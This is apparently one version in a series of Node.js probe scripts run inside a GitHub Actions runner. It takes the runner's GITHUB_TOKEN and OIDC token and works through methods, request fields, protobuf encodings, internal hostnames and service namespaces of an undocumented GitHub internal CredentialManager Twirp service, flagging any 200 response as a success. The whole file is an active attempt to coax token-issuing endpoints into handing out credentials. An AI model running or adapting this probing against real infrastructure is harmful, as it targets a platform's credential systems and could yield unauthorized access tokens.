const https = require('https');

// v22: CredentialManager Twirp service — format probing
// Key finding from v21: /twirp/github.authentication.v0.CredentialManager/{method}
// returns 400 "malformed" (not 404) on runner host with all tested methods.
// This means the routes EXIST and auth passes (or is post-parse).
// Goal: find the right request format to get a 200.

const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
const GITHUB_RUN_ID = process.env.GITHUB_RUN_ID || '';
const GITHUB_REPOSITORY_ID = process.env.GITHUB_REPOSITORY_ID || '';

function rawReq(hostname, path, method, headers, body) {
  return new Promise((resolve) => {
    const opts = { hostname, path, method: method || 'POST', headers };
    const r = https.request(opts, (res) => {
      let d = ''; res.on('data', c => d += c);
      res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 400), headers: res.headers }));
    });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    if (body) { r.write(body); }
    r.end();
  });
}

function buildHeaders(token, ct, len) {
  const h = { 'Content-Type': ct, 'Content-Length': len, 'User-Agent': 'probe', 'Accept': ct };
  if (token) h['Authorization'] = 'Bearer ' + token;
  return h;
}

function twirpJson(hostname, service, method, token, body) {
  const path = '/twirp/' + service + '/' + method;
  const data = typeof body === 'string' ? body : JSON.stringify(body);
  return rawReq(hostname, path, 'POST', buildHeaders(token, 'application/json', Buffer.byteLength(data)), data);
}

function twirpProto(hostname, service, method, token, bodyBuf) {
  const path = '/twirp/' + service + '/' + method;
  return rawReq(hostname, path, 'POST', buildHeaders(token, 'application/protobuf', bodyBuf.length), bodyBuf);
}

// Encode a protobuf string field: field_num << 3 | 2 (LEN wire type)
function protoString(fieldNum, value) {
  const valueBytes = Buffer.from(value, 'utf8');
  const tag = (fieldNum << 3) | 2;
  const tagBuf = Buffer.from([tag]);
  const lenBuf = Buffer.from([valueBytes.length]);
  return Buffer.concat([tagBuf, lenBuf, valueBytes]);
}

async function main() {
  console.log('=== V22: CredentialManager format probe ===');
  console.log('Repo:', GITHUB_REPOSITORY, '| Run:', GITHUB_RUN_ID);

  const oidcHost = OIDC_URL ? new URL(OIDC_URL).hostname : null;
  const poolId = OIDC_URL ? new URL(OIDC_URL).pathname.split('/')[1] : null;
  console.log('OIDC host:', oidcHost, '| Pool:', poolId);

  if (!oidcHost) { console.log('No OIDC host!'); return; }

  const SVC = 'github.authentication.v0.CredentialManager';
  const METHOD = 'GetToken';

  // === TEST 1: Determine if auth is checked before request parsing ===
  // Compare: no auth vs valid GITHUB_TOKEN vs valid OIDC_TOKEN
  console.log('\n=== TEST 1: Auth check timing (no-auth vs token) ===');
  const noAuth = await twirpJson(oidcHost, SVC, METHOD, null, {});
  const withToken = await twirpJson(oidcHost, SVC, METHOD, GITHUB_TOKEN, {});
  const withOidc = await twirpJson(oidcHost, SVC, METHOD, OIDC_TOKEN, {});
  console.log('[NO_AUTH]    :', noAuth.status, '|', noAuth.body.substring(0, 100));
  console.log('[GH_TOKEN]   :', withToken.status, '|', withToken.body.substring(0, 100));
  console.log('[OIDC_TOKEN] :', withOidc.status, '|', withOidc.body.substring(0, 100));
  // If all three return the same error → auth is not the gate (or happens after format check)
  // If no-auth differs → auth IS checked first

  // === TEST 2: Binary protobuf with empty body ===
  console.log('\n=== TEST 2: Binary protobuf encoding ===');
  // Empty protobuf message = 0 bytes
  const emptyProto = Buffer.alloc(0);
  const r2a = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, emptyProto);
  console.log('[PROTO_EMPTY]:', r2a.status, '|', r2a.body.substring(0, 150));

  // Protobuf with field 1 = "Zelys-DFKH/depbot-ssrf-test"
  const repoField = protoString(1, GITHUB_REPOSITORY);
  const r2b = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, repoField);
  console.log('[PROTO_F1_REPO]:', r2b.status, '|', r2b.body.substring(0, 150));

  // Protobuf with field 1 = "api.github.com" (audience)
  const audField = protoString(1, 'api.github.com');
  const r2c = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, audField);
  console.log('[PROTO_F1_AUD]:', r2c.status, '|', r2c.body.substring(0, 150));

  // Protobuf with field 2 = repository_id (varint)
  const repoIdBuf = Buffer.from([0x10, ...encodeVarint(parseInt(GITHUB_REPOSITORY_ID) || 1277673145)]);
  const r2d = await twirpProto(oidcHost, SVC, METHOD, GITHUB_TOKEN, repoIdBuf);
  console.log('[PROTO_F2_REPOID]:', r2d.status, '|', r2d.body.substring(0, 150));

  // === TEST 3: JSON field name variations ===
  console.log('\n=== TEST 3: JSON field name variations for GetToken ===');
  const fieldVariants = [
    {},
    { audience: 'api.github.com' },
    { audience: 'api.github.com', repository: GITHUB_REPOSITORY },
    { resource: GITHUB_REPOSITORY },
    { token_type: 'installation' },
    { repository_full_name: GITHUB_REPOSITORY },
    { repository_id: GITHUB_REPOSITORY_ID },
    { installation_id: '19454198618' },
    { run_id: GITHUB_RUN_ID, repository: GITHUB_REPOSITORY },
    { context: { repository: GITHUB_REPOSITORY, run_id: GITHUB_RUN_ID } },
  ];
  for (const body of fieldVariants) {
    const r = await twirpJson(oidcHost, SVC, METHOD, GITHUB_TOKEN, body);
    const key = Object.keys(body).join(',') || 'empty';
    const isOk = r.status === 200;
    if (isOk) console.log('[JSON_FIELD ***SUCCESS***] ' + key + ': ' + r.status + ' | ' + r.body);
    else console.log('[JSON_FIELD] ' + key + ': ' + r.status + ' | ' + r.body.substring(0, 80));
  }

  // === TEST 4: Other method names with correct-ish body ===
  console.log('\n=== TEST 4: Method enumeration with audience body ===');
  const methods = [
    'GetToken', 'IssueToken', 'GetInstallationToken', 'GetCredentials',
    'GetJobToken', 'GetActionsToken', 'GetActionToken', 'CreateToken',
    'ExchangeToken', 'GenerateToken', 'GetAccessToken', 'GetOAuthToken',
    'GetRepositoryToken', 'GetRepoToken', 'GetOrganizationToken',
    'GetWorkflowToken', 'GetRunnerToken',
  ];
  const audbody = { audience: 'api.github.com', repository: GITHUB_REPOSITORY };
  for (const m of methods) {
    const r = await twirpJson(oidcHost, SVC, m, GITHUB_TOKEN, audbody);
    const isBadRoute = r.body.includes('bad_route') || r.body.includes('no handler');
    const label = isBadRoute ? '404(NO_ROUTE)' : String(r.status);
    const isOk = r.status === 200;
    if (isOk) console.log('[METHOD ***SUCCESS***] ' + m + ': ' + r.status + ' | ' + r.body.substring(0, 200));
    else if (!isBadRoute) console.log('[METHOD EXISTS] ' + m + ': ' + label + ' | ' + r.body.substring(0, 80));
    else console.log('[METHOD] ' + m + ': ' + label);
  }

  // === TEST 5: Try CredentialManager on other internal hostnames ===
  console.log('\n=== TEST 5: Alternative CredentialManager hosts ===');
  // The runner might also have a CredentialManager at the standard runner backend
  // Let's try common GitHub internal endpoints
  const altHosts = [
    'pipelines.actions.githubusercontent.com',
    'productionresults.actions.githubusercontent.com',
    'results-receiver.actions.githubusercontent.com',
  ];
  for (const host of altHosts) {
    const r = await twirpJson(host, SVC, 'GetToken', GITHUB_TOKEN, { audience: 'api.github.com' });
    const isBadRoute = r.body.includes('bad_route');
    if (r.status !== 'ERR') {
      console.log('[ALT_HOST] ' + host + ': ' + r.status + ' | ' + r.body.substring(0, 100));
    }
  }

  // === TEST 6: What's the full path structure? Check GET vs POST ===
  console.log('\n=== TEST 6: HTTP method variations ===');
  const getReq = await rawReq(oidcHost, '/twirp/' + SVC + '/GetToken', 'GET', {
    'Authorization': 'Bearer ' + GITHUB_TOKEN,
    'Accept': 'application/json',
    'User-Agent': 'probe',
  }, null);
  console.log('[GET_METHOD]:', getReq.status, '|', getReq.body.substring(0, 100));

  // Try with specific Twirp version header
  const twirpHeader = await rawReq(oidcHost, '/twirp/' + SVC + '/GetToken', 'POST', {
    'Authorization': 'Bearer ' + GITHUB_TOKEN,
    'Content-Type': 'application/json',
    'Content-Length': 2,
    'Twirp-Version': '7.2.0',
    'User-Agent': 'twirp/7.2.0',
  }, Buffer.from('{}'));
  console.log('[TWIRP_HDR]:', twirpHeader.status, '|', twirpHeader.body.substring(0, 100));

  // === TEST 7: Enumerate service namespace ===
  // Maybe it's under a slightly different namespace
  console.log('\n=== TEST 7: Service namespace variations ===');
  const namespaces = [
    'github.authentication.v0.CredentialManager',
    'github.authentication.v1.CredentialManager',
    'github.actions.authentication.v0.CredentialManager',
    'authentication.CredentialManager',
    'github.authentication.CredentialManager',
  ];
  for (const ns of namespaces) {
    const r = await twirpJson(oidcHost, ns, 'GetToken', GITHUB_TOKEN, { audience: 'api.github.com' });
    const isBadRoute = r.body.includes('bad_route') || r.body.includes('no handler') || r.status === 404;
    if (!isBadRoute) console.log('[NS EXISTS] ' + ns + ': ' + r.status + ' | ' + r.body.substring(0, 100));
    else console.log('[NS] ' + ns + ': 404');
  }

  console.log('\nDone.');
}

function encodeVarint(n) {
  const bytes = [];
  while (n > 127) {
    bytes.push((n & 0x7F) | 0x80);
    n = n >>> 7;
  }
  bytes.push(n & 0x7F);
  return bytes;
}

main().catch(e => console.log('Fatal:', e.message));
